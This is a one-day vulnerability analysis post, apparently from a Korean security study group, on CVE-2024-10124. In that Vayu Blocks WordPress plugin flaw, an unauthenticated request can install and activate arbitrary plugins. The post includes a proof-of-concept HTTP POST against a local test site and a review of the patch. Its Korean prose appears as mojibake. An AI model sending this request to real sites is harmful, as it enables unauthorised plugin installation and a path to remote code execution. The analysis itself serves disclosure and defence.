---
title: "[CVE-2024-10124] ì·¨ì•½ì  ë¶„ì„ ë³´ê³ ì„œ"
description: "â€˜Vayu Blocks â€“ Gutenberg Blocks for WordPress & WooCommerce(ì´í•˜, Vayu Blocks)â€™ ì˜ ë²„ì „ 1.1.1 ì´í•˜ì—ì„œ ì¸ì¦ë˜ì§€ ì•Šì€ ì‚¬ìš©ìê°€ ì„ì˜ì˜ í”ŒëŸ¬ê·¸ì¸ì„ ì„¤ì¹˜ ë° í™œì„±í™”í•  ìˆ˜ ìˆëŠ” ì·¨ì•½ì "
author: dottak
date: 2024-12-17 12:54:00 +0900
categories: [One-Day ë¶„ì„, WordPress]
tags: [ë¹¡ê³µíŒŸ, ì½˜í…ŒìŠ¤íŠ¸ ë„¤ë·¸ë¼, CVE-2024-10124]
image: assets/img/wordpress-thumbnail.png
exclude_img: true
---

## ğŸ“Œ Analysis

### 1. ê°œìš”

`CVE-2024-10124` ì·¨ì•½ì ì€ ì›Œë“œí”„ë ˆìŠ¤ í”ŒëŸ¬ê·¸ì¸ â€˜Vayu Blocks â€“ Gutenberg Blocks for WordPress & WooCommerce(ì´í•˜, Vayu Blocks)â€™ ì˜ ë²„ì „ 1.1.1 ì´í•˜ì—ì„œ ì¸ì¦ë˜ì§€ ì•Šì€ ì‚¬ìš©ìê°€ ì„ì˜ì˜ í”ŒëŸ¬ê·¸ì¸ì„ ì„¤ì¹˜ ë° í™œì„±í™”í•  ìˆ˜ ìˆëŠ” ì·¨ì•½ì  ì…ë‹ˆë‹¤.

### 2. ì·¨ì•½ì  ë¶„ì„

> âš ï¸
> CVE-2024-10124ì˜ ê²½ìš° ë²„ì „ 1.1.1 ì´í•˜ì—ì„œ ë°œìƒí•˜ëŠ” ì·¨ì•½ì ì´ë¼ ëª…ì‹œë˜ì–´ ìˆì§€ë§Œ, ì¸ì¦ë˜ì§€ ì•Šì€ ì‚¬ìš©ìë¡œ ì·¨ì•½ì ì„ ì¬í˜„ í•˜ë ¤ë©´ ë²„ì „ 1.1.0 ì´í•˜ì—ì„œ ìˆ˜í–‰í•´ì•¼ í•©ë‹ˆë‹¤.
>

Vayu Blocks í”ŒëŸ¬ê·¸ì¸ì˜ ëŒ€ì‹œë³´ë“œ ë©”ë‰´ 'Vayu Sites'ì—ì„œëŠ” í•´ë‹¹ í”ŒëŸ¬ê·¸ì¸ì„ ì‚¬ìš©í•˜ì—¬ ê¸°ë³¸ í…œí”Œë¦¿ì„ ì§€ì •í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

![image](assets/posts/one-day/2024-12-17/image-001.png)

í…œí”Œë¦¿ì€ ì•„ë˜ì™€ ê°™ì´ í…Œë§ˆë¡œ ì´ë£¨ì–´ì§„ ì›Œë“œí”„ë ˆìŠ¤ ì‚¬ì´íŠ¸ë¥¼ í™•ì¸í•  ìˆ˜ ìˆìœ¼ë©°,

![image](assets/posts/one-day/2024-12-17/image-002.png)

ì›í•˜ëŠ” í…œí”Œë¦¿ì„ ì„ íƒí•œ ë’¤ í•˜ë‹¨ì˜ CONTINUE ë²„íŠ¼ì„ í´ë¦­í•˜ë©´,

![image](assets/posts/one-day/2024-12-17/image-003.png)

ì›Œë“œí”„ë ˆìŠ¤ ì‚¬ì´íŠ¸ì— í…œí”Œë¦¿ ì ìš©ì— í•„ìš”í•œ í…Œë§ˆ ë° í”ŒëŸ¬ê·¸ì¸ì´ ì„¤ì¹˜ëœë‹¤ëŠ” í™•ì¸ í˜ì´ì§€ê°€ ë‚˜íƒ€ë‚©ë‹ˆë‹¤. ì´ì–´ì„œ Build My Website ë²„íŠ¼ì„ í´ë¦­í•˜ë©´ ì„¤ì¹˜ê°€ ì§„í–‰ë©ë‹ˆë‹¤.

![image](assets/posts/one-day/2024-12-17/image-004.png)

ì„¤ì¹˜ê°€ ì‹œì‘ë  ë•Œ, HTTP ìš”ì²­ íŒ¨í‚·ì„ ì‚´í´ë³´ë©´ ì´ 5ê°œì˜ í”ŒëŸ¬ê·¸ì¸ì„ ì¶”ê°€ ì„¤ì¹˜í•˜ê¸° ìœ„í•œ ë°ì´í„°ê°€ ì „ì†¡ë˜ëŠ” ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

![image](assets/posts/one-day/2024-12-17/image-005.png)

ë°ì´í„°ë¥¼ ì‚´í´ë³´ë©´ `plugin`ì˜ ê°’ì€ ì„¤ì¹˜í•  í”ŒëŸ¬ê·¸ì¸ì˜ slugì™€ í”ŒëŸ¬ê·¸ì¸ ì´ë¦„ì´ í‚¤-ê°’ ìŒìœ¼ë¡œ êµ¬ì„±ë˜ì–´ ìˆìŠµë‹ˆë‹¤(ì˜ˆ: `"woocommerce": "Woocommerce"`). ì´ë•Œ í‚¤ì— í•´ë‹¹í•˜ëŠ” ìŠ¬ëŸ¬ê·¸(`"woocommerce"`)ëŠ” `allPlugins`ì˜ ê°’ì—ë„ ë™ì¼í•˜ê²Œ ì¡´ì¬í•˜ë©°, ì—¬ê¸°ì„œëŠ” í”ŒëŸ¬ê·¸ì¸ ì„¤ì¹˜ë¥¼ ìœ„í•œ ì—”ë“œí¬ì¸íŠ¸(`woocommerce/woocommerce.php`) ê²½ë¡œë¥¼ ì§€ì •í•˜ê³  ìˆìŠµë‹ˆë‹¤.

ìœ„ ìš”ì²­ì€ Vayu Blocks í”ŒëŸ¬ê·¸ì¸ì˜ `wp-content/plugins/vayu-blocks/inc/vayu-sites/app.php` íŒŒì¼ë‚´ `tp_install` í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•©ë‹ˆë‹¤.

![image](assets/posts/one-day/2024-12-17/image-006.png)

ì´ë•Œ, `tp_install` í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•œ ì‚¬ìš©ìì— ëŒ€í•œ ì ‘ê·¼ ê¶Œí•œì„ ê²€ì‚¬í•˜ì§€ ì•Šê³  ìˆìŠµë‹ˆë‹¤. ë”°ë¼ì„œ ì¸ì¦ë˜ì§€ ì•Šì€ ì‚¬ìš©ìê°€ `tp_instasll` í•¨ìˆ˜ í˜¸ì¶œì„ ìœ„í•œ ìš”ì²­ íŒ¨í‚·ì„ ì „ë‹¬í•  ê²½ìš° ì„ì˜ì˜ í”ŒëŸ¬ê·¸ì¸ì„ ì„¤ì¹˜ ë° í™œì„±í™” í•  ìˆ˜ ìˆëŠ” ì·¨ì•½ì ì´ ë°œìƒí•©ë‹ˆë‹¤.

ì´ë¥¼ í†µí•´ ì¸ì¦ë˜ì§€ ì•Šì€ ê³µê²©ìê°€ ì„ì˜ì˜ í”ŒëŸ¬ê·¸ì¸ì„ ì„¤ì¹˜ ë° í™œì„±í™”í•˜ì—¬ ë‹¤ë¥¸ ì·¨ì•½í•œ í”ŒëŸ¬ê·¸ì¸ì„ ë‚´ë ¤ë°›ì•„ ì›ê²© ì½”ë“œ ì‹¤í–‰ì„ ìˆ˜í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

## ğŸ“Œ PoC

Vayu Blocks í”ŒëŸ¬ê·¸ì¸ ë²„ì „ 1.1.0ì„ ì„¤ì¹˜í•œ í›„ ì•„ë˜ì˜ HTTP íŒ¨í‚·ì„ ì „ì†¡í•©ë‹ˆë‹¤. ì´ íŒ¨í‚·ì€ ì¸ì¦ë˜ì§€ ì•Šì€ ì‚¬ìš©ìê°€ ëŒ€ìƒ ì›Œë“œí”„ë ˆìŠ¤ ì‚¬ì´íŠ¸ì— Classic Editor í”ŒëŸ¬ê·¸ì¸ì„ ì„¤ì¹˜í•˜ë„ë¡ í•˜ëŠ” ìš”ì²­ì…ë‹ˆë‹¤.

```plaintext
POST /wp-json/ai/v1/vayu-site-builder HTTP/1.1
Host: localhost:8080
Content-Type: application/json
Content-Length: 372

{
    "params": {
        "plugin": {
            "classic-editor": "Classic Editor"
        },
        "allPlugins": [
            {
                "classic-editor": "classic-editor/classic-editor.php"
            }
        ],
        "themeSlug": "",
        "proThemePlugin": "",
        "templateType": "free",
        "tmplFreePro": "plugin"
    }
}
```

ìœ„ ìš”ì²­ íŒ¨í‚·ì„ ë³´ë‚´ë©´ ì„œë²„ë¡œë¶€í„° ì •ìƒì ì¸ ì‘ë‹µ ë©”ì‹œì§€ë¥¼ ìˆ˜ì‹ í•  ìˆ˜ ìˆìœ¼ë©°,

![image](assets/posts/one-day/2024-12-17/image-007.png)

ì›Œë“œí”„ë ˆìŠ¤ ì‚¬ì´íŠ¸ì— Classic Editor í”ŒëŸ¬ê·¸ì¸ì´ ì„¤ì¹˜ ë° í™œì„±í™”ëœ ê²ƒì„ í™•ì¸í•˜ì‹¤ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

![image](assets/posts/one-day/2024-12-17/image-008.png)

## ğŸ“Œ íŒ¨ì¹˜ í™•ì¸

ì¦‰ì‹œ íŒ¨ì¹˜ëœ ë‚´ìš©ì€ `current_user_can('manage_options')` í•¨ìˆ˜ë¥¼ ì´ìš©í•˜ì—¬ ê´€ë¦¬ì(Administrator) ì—­í• ì„ ê°€ì§€ëŠ” ì‚¬ìš©ìë§Œì´ `tp_install` í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•˜ë„ë¡ í•˜ê³  ìˆìŠµë‹ˆë‹¤.

> [https://plugins.trac.wordpress.org/changeset/3173408/vayu-blocks/trunk/inc/vayu-sites/app.php?old=3091496&old_path=vayu-blocks%2Ftrunk%2Finc%2Fvayu-sites%2Fapp.php](https://plugins.trac.wordpress.org/changeset/3173408/vayu-blocks/trunk/inc/vayu-sites/app.php?old=3091496&old_path=vayu-blocks%2Ftrunk%2Finc%2Fvayu-sites%2Fapp.php)
> 

![image](assets/posts/one-day/2024-12-17/image-009.png)

ì´í›„ ì¶”ê°€ë¡œ íŒ¨ì¹˜ ëœ ë‚´ìš©ìœ¼ë¡œëŠ” CSRF ê³µê²©ì„ ë°©ì–´í•˜ê¸° ìœ„í•´ Nonce ê°’ ê²€ì¦ì„ ìˆ˜í–‰í•˜ê³  ìˆìŠµë‹ˆë‹¤.

> [https://plugins.trac.wordpress.org/changeset/3203532/vayu-blocks/tags/1.2.0/inc/vayu-sites/app.php](https://plugins.trac.wordpress.org/changeset/3203532/vayu-blocks/tags/1.2.0/inc/vayu-sites/app.php)
> 

![image](assets/posts/one-day/2024-12-17/image-010.png)